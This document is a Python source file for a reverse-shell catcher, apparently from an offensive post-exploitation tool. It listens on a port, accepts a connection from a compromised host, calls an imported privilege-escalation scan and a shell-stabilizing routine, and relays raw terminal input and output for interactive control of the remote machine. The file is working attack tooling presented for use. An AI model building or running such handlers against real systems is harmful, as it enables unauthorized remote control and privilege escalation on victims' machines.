#!/usr/bin/env python3

import socket
import sys
import os
import select
import termios
import tty
from src.stabalize import stable
from src.colours import GREEN, RESET, RED
from src.escalate import Escalate


class Sock:
    def __init__(self, sock, address):
        self.sock = sock
        self.address = address

    def recv(self):
        try:
            return self.sock.recv(65535)

        except socket.timeout:
            return b""

        except (ConnectionResetError, BrokenPipeError):
            print(f"\n{RED}[-] Connection closed{RESET}")
            return None


    def send(self, data):
        if isinstance(data, str):
            data = data.encode()

        try:
            self.sock.sendall(data)
        except (ConnectionResetError, BrokenPipeError):
            print(f"\n{RED}[-] Connection closed{RESET}")

    def close(self):
        self.sock.close()

class Shell:
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.sock = None
        self.server = None

    def listen(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.address, self.port))
        self.server.listen(1)
        
        print(f"{GREEN}listening on {self.address}:{self.port}")
        session, host = self.server.accept()
        print(f"connection from {host}{RESET}")
        session.settimeout(1)
        self.sock = Sock(session, host)
    
    def terminal(self):
 
        esc = Escalate(self)
        esc.scan()

        SHELL = stable(self)
        SHELL.inspect()
        SHELL.upgrade()
        old_settings = termios.tcgetattr(sys.stdin)

        try:
            tty.setraw(sys.stdin.fileno())

            while True:
                try:
                    ready, _, _ = select.select(
                        [sys.stdin, self.sock.sock],
                        [],
                        []
                    )

                    if self.sock.sock in ready:
                        data = self.sock.recv()

                        if data is None:
                            break
        
                        if data:
                            os.write(sys.stdout.fileno(), data)

                    if sys.stdin in ready:
                        data = os.read(sys.stdin.fileno(), 4096)

                        # Ctrl-]
                        if b"\x1d" in data:
                            self.command("exit\n")
                            break

                        if data:
                            self.sock.send(data)

                except KeyboardInterrupt:
                    break

        except Exception as e:
            print(f"\n[-] Error: {e}")

        finally:
            termios.tcsetattr(
                sys.stdin,
                termios.TCSADRAIN,
                old_settings
            )

            self.sock.close()
            self.server.close()

            print(f"\n{GREEN}[*] Connection closed{RESET}")

    def command(self, cmd):
        if cmd:
            self.sock.send(cmd + "\n")
            return self.sock.recv()
        

